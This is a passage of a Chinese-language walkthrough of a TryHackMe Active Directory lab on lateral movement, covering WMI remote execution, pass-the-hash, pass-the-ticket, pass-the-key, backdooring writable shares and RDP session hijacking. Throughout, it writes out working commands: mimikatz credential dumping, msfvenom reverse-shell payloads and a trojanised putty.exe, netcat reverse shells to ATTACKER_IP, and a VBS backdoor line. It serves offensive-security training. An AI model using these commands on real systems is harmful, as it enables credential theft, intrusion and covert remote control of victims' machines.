class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-ClassName</span> Win32_Process <span class="literal">-MethodName</span> Create <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">CommandLine = <span class="variable">$Command</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请注意，WMI 不允许您查看任何命令的输出，但确实会默默地创建所需的进程。</p><p>在旧系统上，可以使用命令提示符中的 wmic 执行相同的操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create &quot;cmd.exe /c calc.exe&quot; </span><br></pre></td></tr></table></figure><p><strong>使用WMI远程创建服务</strong></p><ul><li>端口：<ul><li>135/ TCP , 49152-65535/ TCP (DCERPC)</li><li>5985/ TCP (WinRM HTTP) 或 5986/ TCP (WinRM HTTPS)</li></ul></li><li>**所需组成员身份：**管理员</li></ul><p>我们可以通过 Powershell 使用WMI创建服务。要创建名为 THMService2 的服务，我们可以使用以下命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-ClassName</span> Win32_Service <span class="literal">-MethodName</span> Create <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">Name = <span class="string">&quot;THMService2&quot;</span>;</span><br><span class="line">DisplayName = <span class="string">&quot;THMService2&quot;</span>;</span><br><span class="line">PathName = <span class="string">&quot;net user munra2 Pass123 /add&quot;</span>; <span class="comment"># Your payload</span></span><br><span class="line">ServiceType = [<span class="built_in">byte</span>]::Parse(<span class="string">&quot;16&quot;</span>); <span class="comment"># Win32OwnProcess : Start service in a new process</span></span><br><span class="line">StartMode = <span class="string">&quot;Manual&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，我们可以获取该服务的句柄并使用以下命令启动它：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Service</span> = <span class="built_in">Get-CimInstance</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-ClassName</span> Win32_Service <span class="literal">-filter</span> <span class="string">&quot;Name LIKE &#x27;THMService2&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-InputObject</span> <span class="variable">$Service</span> <span class="literal">-MethodName</span> StartService</span><br></pre></td></tr></table></figure><p>最后，我们可以使用以下命令停止并删除该服务：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-InputObject</span> <span class="variable">$Service</span> <span class="literal">-MethodName</span> StopService</span><br><span class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-InputObject</span> <span class="variable">$Service</span> <span class="literal">-MethodName</span> Delete</span><br></pre></td></tr></table></figure><p><strong>使用WMI远程创建计划任务</strong></p><ul><li>端口：<ul><li>135/ TCP , 49152-65535/ TCP (DCERPC)</li><li>5985/ TCP (WinRM HTTP) 或 5986/ TCP (WinRM HTTPS)</li></ul></li><li>**所需组成员身份：**管理员</li></ul><p>我们可以使用 Windows 默认安装中的某些 cmdlet 创建和执行计划任务：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Payload must be split in Command and Args</span></span><br><span class="line"><span class="variable">$Command</span> = <span class="string">&quot;cmd.exe&quot;</span></span><br><span class="line"><span class="variable">$Args</span> = <span class="string">&quot;/c net user munra22 aSdf1234 /add&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Action</span> = <span class="built_in">New-ScheduledTaskAction</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-Execute</span> <span class="variable">$Command</span> <span class="literal">-Argument</span> <span class="variable">$Args</span></span><br><span class="line"><span class="built_in">Register-ScheduledTask</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-Action</span> <span class="variable">$Action</span> <span class="literal">-User</span> <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> <span class="literal">-TaskName</span> <span class="string">&quot;THMtask2&quot;</span></span><br><span class="line"><span class="built_in">Start-ScheduledTask</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-TaskName</span> <span class="string">&quot;THMtask2&quot;</span></span><br></pre></td></tr></table></figure><p>要删除使用过的计划任务，我们可以使用以下命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Unregister-ScheduledTask</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-TaskName</span> <span class="string">&quot;THMtask2&quot;</span></span><br></pre></td></tr></table></figure><p><strong>通过WMI安装 MSI 包</strong></p><ul><li>端口：<ul><li>135/ TCP , 49152-65535/ TCP (DCERPC)</li><li>5985/ TCP (WinRM HTTP) 或 5986/ TCP (WinRM HTTPS)</li></ul></li><li>**所需组成员身份：**管理员</li></ul><p>MSI 是安装程序使用的文件格式。如果我们可以将 MSI 包复制到目标系统，那么我们就可以使用 WMI 尝试为我们安装它。攻击者可以用任何可用的方法来复制该文件。 一旦 MSI 文件进入目标系统，我们就可以通过WMI调用 Win32_Product 类来尝试安装它：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-ClassName</span> Win32_Product <span class="literal">-MethodName</span> Install <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;PackageLocation = <span class="string">&quot;C:\Windows\myinstaller.msi&quot;</span>; Options = <span class="string">&quot;&quot;</span>; AllUsers = <span class="variable">$false</span>&#125;</span><br></pre></td></tr></table></figure><p>我们可以在旧系统中使用 wmic 实现相同的功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi</span><br></pre></td></tr></table></figure><blockquote><p>示例：</p><p><strong>用户：</strong> <a href="http://ZA.TRYHACKME.COM">ZA.TRYHACKME.COM</a>\t1_corine.waters</p><p><strong>密码：</strong> Korine.1994</p><p>我们将展示如何使用这些凭据通过WMI和 MSI 包横向移动到THM -IIS</p><p>我们将首先使用攻击者机器上的 msfvenom 创建 MSI 有效负载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi &gt; myinstaller.msi</span><br></pre></td></tr></table></figure><p>然后我们使用SMB或任何其他可用方法复制有效载荷：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ smbclient -c &#x27;put myinstaller.msi&#x27; -U t1_corine.waters -W ZA &#x27;//thmiis.za.tryhackme.com/admin$/&#x27; Korine.1994</span><br><span class="line"> putting file myinstaller.msi as \myinstaller.msi (0.0 kb/s) (average 0.0 kb/s)</span><br></pre></td></tr></table></figure><p>由于我们将有效载荷复制到了 ADMIN$ 共享，因此它将在服务器上的 C:\Windows\ 中可用。</p><p>我们启动一个处理程序来接收来自Metasploit的反向 shell ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; set LHOST lateralmovement</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 4445</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/x64/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.16:4445</span><br></pre></td></tr></table></figure><p>让我们从 Powershell 控制台针对 THMIIS启动WMI会话：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; $username = &#x27;t1_corine.waters&#x27;;</span><br><span class="line">PS C:\&gt; $password = &#x27;Korine.1994&#x27;;</span><br><span class="line">PS C:\&gt; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;</span><br><span class="line">PS C:\&gt; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;</span><br><span class="line">PS C:\&gt; $Opt = New-CimSessionOption -Protocol DCOM</span><br><span class="line">PS C:\&gt; $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop</span><br></pre></td></tr></table></figure><p>然后我们调用 Win32_Product 类的 Install 方法来触发有效负载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @&#123;PackageLocation = &quot;C:\Windows\myinstaller.msi&quot;; Options = &quot;&quot;; AllUsers = $false&#125;</span><br></pre></td></tr></table></figure><p>接收到反向shell</p></blockquote><h5 id="使用身份验证材料">使用身份验证材料</h5><p>若已成功获取用户 NTLM 哈希或 Kerberos 票证。您无需知道密码，就可以利用此项作为用户身份验证的手段。</p><p><strong>NTLM身份验证</strong></p><p>在深入研究实际的横向移动技术之前，让我们先来看看NTLM身份验证的工作原理：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9434c96e1bc0519f8d851b44d85b6702.png" alt="NTLM 身份验证"></p><ol><li>客户端向其想要访问的服务器发送身份验证请求。</li><li>服务器生成一个随机数并将其作为挑战发送给客户端。</li><li>客户端将其NTLM密码哈希与质询（和其他已知数据）结合起来，生成对质询的响应并将其发送回服务器进行验证。</li><li>服务器将质询和响应都转发给域控制器进行验证。</li><li>域控制器使用该质询重新计算响应，并将其与客户端发送的初始响应进行比较。如果两者匹配，则客户端通过身份验证；否则，访问被拒绝。身份验证结果将发送回服务器。</li><li>服务器将认证结果转发给客户端。</li></ol><p>**注意：**所述流程适用于使用域帐户的情况。如果使用本地帐户，服务器可以验证对质询的响应本身，而无需与域控制器交互，因为它已将密码哈希存储在其 SAM 上。</p><p><strong>传递哈希</strong></p><p>从我们已获得管理权限的主机提取凭据（通过使用 <a href="https://github.com/gentilkiwi/mimikatz/releases?ref=benheater.com">mimikatz</a> 或类似工具）后，我们可能会获得可轻松破解的明文密码或哈希值。但是，如果我们不够幸运，我们最终会得到无法破解的NTLM密码哈希值。</p><p>虽然看起来我们无法真正使用这些哈希，但只要知道密码哈希，就可以响应身份验证期间发送的NTLM质询。这意味着我们可以在不需要知道明文密码的情况下进行身份验证。如果 Windows 域配置为使用 NTLM 身份验证，我们无需破解 NTLM 哈希，就可以<strong>传递哈希</strong>(PtH) 并成功进行身份验证。</p><p>要提取NTLM哈希，我们可以使用 mimikatz 读取本地 SAM 或直接从 LSASS 内存中提取哈希。</p><p><strong>从本地 SAM提取NTLM哈希：</strong></p><p>此方法仅允许您从计算机上的本地用户获取哈希值。域用户的哈希值不可用。</p><p>THMJMP2: Powershell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # token::elevate</span><br><span class="line"></span><br><span class="line">mimikatz # lsadump::sam   </span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: 145e02c50333951f71d13c245d352b50</span><br></pre></td></tr></table></figure><p><strong>从 LSASS 内存中提取NTLM哈希：</strong></p><p>此方法将允许您提取本地用户和最近登录到机器的任何域用户的任何NTLM哈希。</p><p>THMJMP2: Powershell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # token::elevate</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::msv </span><br><span class="line">Authentication Id : 0 ; 308124 (00000000:0004b39c)</span><br><span class="line">Session           : RemoteInteractive from 2 </span><br><span class="line">User Name         : bob.jenkins</span><br><span class="line">Domain            : ZA</span><br><span class="line">Logon Server      : THMDC</span><br><span class="line">Logon Time        : 2022/04/22 09:55:02</span><br><span class="line">SID               : S-1-5-21-3330634377-1326264276-632209373-4605</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : bob.jenkins</span><br><span class="line">         * Domain   : ZA</span><br><span class="line">         * NTLM     : 6b4a57f67805a663c818106dc0648484</span><br></pre></td></tr></table></figure><p>然后，我们可以使用提取的哈希值执行 PtH 攻击，方法是使用 mimikatz 在反向 shell（或任何其他你喜欢的命令）上为受害者用户注入访问令牌，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # token::revert</span><br><span class="line">mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555&quot;</span><br></pre></td></tr></table></figure><p>请注意，我们曾经<code>token::revert</code>重新建立过我们原始的令牌权限，因为尝试使用提升的令牌传递哈希是行不通的。</p><p>这相当于使用<code>runas /netonly</code>哈希而不是密码，并将产生一个新的反向 shell，我们可以从中以受害者用户的身份启动任何命令。</p><p>为了接收反向 shell，我们应该在 AttackBox 上运行一个反向监听器：</p><p>攻击框</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ nc -lvp 5555</span><br></pre></td></tr></table></figure><p>有趣的是，如果你在此 shell 上运行 whoami 命令，它仍会显示执行 PtH 之前你使用的原始用户，但从这里运行的任何命令实际上都会使用我们使用 PtH 注入的凭据。</p><p><strong>使用Linux传递哈希：</strong></p><p>如果您可以访问 Linux 机器（例如 AttackBox），则有几种工具内置支持使用不同协议执行 PtH。根据可用的服务，您可以执行以下操作：</p><p><em>使用 PtH连接到RDP：</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH</span><br></pre></td></tr></table></figure><p><em>使用 PtH 通过 psexec 连接：</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP</span><br></pre></td></tr></table></figure><p>**注意：**只有 Linux 版本的 psexec 支持 PtH。</p><p><em>使用 PtH 连接到 WinRM：</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH</span><br></pre></td></tr></table></figure><p><strong>Kerberos身份验证</strong></p><p>让我们快速了解一下Kerberos身份验证在 Windows 网络上的工作原理：</p><ol><li><p>用户将其用户名和使用从其密码派生的密钥加密的时间戳发送到<strong>密钥分发中心 (KDC)</strong> ，该服务通常安装在负责在网络上创建Kerberos票证的域控制器上。</p><p>KDC 将创建并返回一个<strong>票据授予票据 ( TGT )</strong>，允许用户请求票据以访问特定服务，而无需将其凭据传递给服务本身。除了 TGT 之外，还会向用户提供<strong>会话密钥</strong>，用户将需要该密钥来生成后续请求。</p><p>请注意， TGT是使用<strong>krbtgt</strong>帐户的密码哈希加密的，因此用户无法访问其内容。重要的是要知道加密的TGT包含会话密钥的副本作为其内容的一部分，并且 KDC 无需存储会话密钥，因为它可以通过解密TGT来恢复副本（如果需要）。</p></li><li><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/855d6fa3ea4076164934a2ba9717ffb5.png" alt="Kerberos 获得 TGT"></p></li><li><p>当用户想要连接到网络上的服务（如共享、网站或数据库）时，他们将使用其TGT向 KDC 请求<strong>票证授予服务 (TGS)</strong>。TGS 是仅允许连接到其创建的特定服务的票证。要请求 TGS，用户将发送使用会话密钥加密的用户名和时间戳，以及 TGT和服务**主体名称 (SPN)，**后者指示我们打算访问的服务和服务器名称。</p><p>因此，KDC 将向我们发送一个 TGS 和一个<strong>服务会话密钥</strong>，我们需要用它们来验证我们要访问的服务。TGS 使用<strong>服务所有者哈希</strong>加密。服务所有者是服务在其下运行的用户或机器帐户。TGS 在其加密内容中包含服务会话密钥的副本，以便服务所有者可以通过解密 TGS 来访问它。</p></li><li><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0db01f1f1434f33fa8fb11de2bd165a6.png" alt="Kerberos 获得 TGS"></p></li><li><p>然后，TGS 可以发送到所需的服务以进行身份验证并建立连接。该服务将使用其配置的帐户的密码哈希来解密 TGS 并验证服务会话密钥。</p></li><li><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5d45b999328017c22b0f249069a88767.png" alt="Kerberos 身份验证"></p></li></ol><p><strong>传递票证</strong></p><p>有时可以使用 mimikatz 从 LSASS 内存中提取Kerberos票证和会话密钥。该过程通常要求我们在受攻击的机器上拥有 SYSTEM 权限，可以按如下方式完成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::tickets /export</span><br></pre></td></tr></table></figure><p>请注意，如果我们只能访问票证而不能访问其对应的会话密钥，我们将无法使用该票证；因此，两者都是必需的。</p><p>虽然 mimikatz 可以从 LSASS 进程的内存中提取任何可用的 TGT 或 TGS，但大多数情况下，我们对 TGT 感兴趣，因为它们可用于请求访问用户被允许访问的任何服务。同时，TGS 仅适用于特定服务。提取 TGT 需要我们拥有管理员的凭据，并且可以使用低权限帐户（仅分配给该帐户的帐户）提取 TGS。</p><p>一旦我们提取了所需的票证，我们就可以使用以下命令将票证注入到当前会话中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi</span><br></pre></td></tr></table></figure><p>在我们自己的会话中注入票证不需要管理员权限。此后，这些票证将可用于我们用于横向移动的任何工具。要检查票证是否已正确注入，可以使用 klist 命令：</p><p>THMJMP2: Powershell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">za\bob.jenkins@THMJMP2 C:\&gt; klist</span><br><span class="line"></span><br><span class="line">Current LogonId is 0:0x1e43562</span><br><span class="line"></span><br><span class="line">Cached Tickets: (1)</span><br><span class="line"></span><br><span class="line">#0&gt;     Client: Administrator @ ZA.TRYHACKME.COM</span><br><span class="line">        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM</span><br><span class="line">        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96</span><br><span class="line">        Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize</span><br><span class="line">        Start Time: 4/12/2022 0:28:35 (local)</span><br><span class="line">        End Time:   4/12/2022 10:28:35 (local)</span><br><span class="line">        Renew Time: 4/23/2022 0:28:35 (local)</span><br><span class="line">        Session Key Type: AES-256-CTS-HMAC-SHA1-96</span><br><span class="line">        Cache Flags: 0x1 -&gt; PRIMARY</span><br><span class="line">        Kdc Called: THMDC.za.tryhackme.com</span><br></pre></td></tr></table></figure><p><strong>传递哈希/传递密钥</strong></p><p>这种攻击与PtH类似，但适用于Kerberos网络。</p><p>当用户请求 TGT 时，他们会发送一个使用从其密码派生的加密密钥加密的时间戳。用于派生此密钥的算法可以是DES（当前 Windows 版本默认禁用）、RC4、AES128 或 AES256，具体取决于安装的 Windows 版本和 Kerberos 配置。如果我们拥有其中任何一个密钥，我们就可以向 KDC 请求 TGT，而无需实际密码，因此得名<strong>传递密钥 (PtK)</strong>。</p><p>我们可以使用 mimikatz 通过以下命令从内存中获取Kerberos加密密钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::ekeys</span><br></pre></td></tr></table></figure><p>根据可用的密钥，我们可以在 mimikatz 上运行以下命令，通过 Pass-the-Key 获取反向 shell（<code>nc64</code>为方便起见，THMJMP2 中已经提供）：</p><p><strong>如果我们有 RC4 哈希：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;</span><br></pre></td></tr></table></figure><p><strong>如果我们有 AES128 哈希：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;</span><br></pre></td></tr></table></figure><p><strong>如果我们有 AES256 哈希：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;</span><br></pre></td></tr></table></figure><p>请注意，使用 RC4 时，密钥将等于用户的 NTLM 哈希。这意味着，如果我们可以提取 NTLM 哈希，只要 RC4 是启用的协议之一，我们就可以使用它来请求TGT 。这种特殊变体通常称为<strong>Overpass-the-Hash (OPtH)</strong>。</p><p>为了接收反向 shell，我们应该在 AttackBox 上运行一个反向监听器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ nc -lvp 5556</span><br></pre></td></tr></table></figure><p>与 PtH 一样，从此 shell 运行的任何命令都将使用通过 mimikatz 注入的凭据。</p><h5 id="滥用用户行为">滥用用户行为</h5><p>在某些情况下，攻击者可以利用用户执行的操作来进一步访问网络中的机器。虽然发生这种情况的方式有很多种，但我们将讨论一些最常见的方式。</p><p><strong>滥用可写共享</strong></p><p>在检查公司环境时，发现合法用户用于执行日常任务的网络共享是很常见的。如果这些共享由于某种原因可写，攻击者可以植入特定文件，迫使用户执行任意有效负载并获得对其计算机的访问权限。</p><p>一种常见的情况是找到托管在网络共享上的脚本或可执行文件的快捷方式。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/70e361f2a43b498e5d487d0394bd0a87.png" alt="PuTTY lnk 文件"></p><p>这样做的原理是，管理员可以在网络共享上维护一个可执行文件，用户可以执行它，而无需将应用程序复制或安装到每个用户的机器上。如果我们作为攻击者拥有此类脚本或可执行文件的写入权限，我们就可以对它们进行后门操作，迫使用户执行我们想要的任何有效载荷。</p><p>尽管脚本或可执行文件托管在服务器上，但当用户在其工作站上打开快捷方式时，可执行文件将从服务器复制到其<code>%temp%</code>文件夹并在工作站上执行。因此，任何有效负载都将在最终用户的工作站（和登录的用户帐户）的上下文中运行。</p><p><strong>.vbs 脚本后门</strong></p><p>举个例子，如果共享资源是一个 VBS 脚本，我们可以将 nc64.exe 的副本放在同一个共享上，并在共享脚本中注入以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateObject(&quot;WScript.Shell&quot;).Run &quot;cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% &amp; %tmp%\nc64.exe -e cmd.exe &lt;attacker_ip&gt; 1234&quot;, 0, True</span><br></pre></td></tr></table></figure><p>这会将 nc64.exe 从共享复制到用户的工作站<code>%tmp%</code>目录，并在用户打开共享的 VBS 脚本时将反向 shell 发送回攻击者。</p><p><strong>.exe 文件后门</strong></p><p>如果共享文件是 Windows 二进制文件，例如 putty.exe，则可以从共享中下载它并使用 msfvenom 向其中注入后门。二进制文件仍将照常工作，但会默默执行额外的有效负载。要创建带后门的 putty.exe，我们可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=&lt;attacker_ip&gt; lport=4444 -b &quot;\x00&quot; -f exe -o puttyX.exe</span><br></pre></td></tr></table></figure><p>生成的 puttyX.exe 将在用户不知情的情况下执行 reverse_tcp meterpreter 有效负载。生成文件后，我们可以替换 Windows 共享上的可执行文件，并使用Metasploit中的 exploit/multi/handler 模块等待任何连接。</p><p><strong>RDP劫持</strong></p><p>当管理员使用远程桌面连接到计算机并关闭RDP客户端而不是注销时，他的会话将无限期地在服务器上保持打开状态。如果您在 Windows Server 2016 及更早版本上拥有 SYSTEM 权限，则可以接管任何现有的RDP会话而无需密码。</p><p>如果我们具有管理员级访问权限，我们可以通过任何我们喜欢的方法获取 SYSTEM 权限。目前，我们将使用 psexec 来执行此操作。首先，让我们以管理员身份运行 cmd.exe：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7ba63227fb9d7244d5814b0e4fd57793.png" alt="以管理员身份运行"></p><p>从那里运行<code>PsExec64.exe</code>（可从 获得<code>C:\tools\</code>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe -s cmd.exe</span><br></pre></td></tr></table></figure><p>要列出服务器上的现有会话，可以使用以下命令：</p><p>命令提示符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; query user</span><br><span class="line"> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME</span><br><span class="line">&gt;administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM</span><br><span class="line"> luke                                    3  Disc            .  4/6/2022 6:51 AM</span><br></pre></td></tr></table></figure><p>根据上面的命令输出，如果我们当前使用管理员用户通过RDP<code>rdp-tcp#6</code>连接，我们的 SESSIONNAME 将是。我们还可以看到名为 luke 的用户已打开一个会话，其 id 为<code>3</code>。 任何具有 <strong>Disc</strong>状态的会话都已被用户打开，目前未被使用。虽然您也可以接管活动会话，但当您这样做时，合法用户将被强制退出其会话，他们可能会注意到这一点。</p><p>要连接到会话，我们将使用 tscon.exe 并指定要接管的会话 ID 以及我们当前的 SESSIONNAME。按照前面的示例，如果我们以管理员用户身份连接，要接管 luke 的会话，我们将使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tscon 3 /dest:rdp-tcp#6</span><br></pre></td></tr></table></figure><p>简单来说，该命令表明 luke 拥有的图形会话应该与管理员用户拥有的RDP会话<code>3</code>连接。</p><p>因此，我们将恢复 luke 的RDP会话并立即连接到它。</p><p><strong>注意：</strong> Windows Server 2019 不允许您如果不知道密码就连接到其他用户的会话。</p><h5 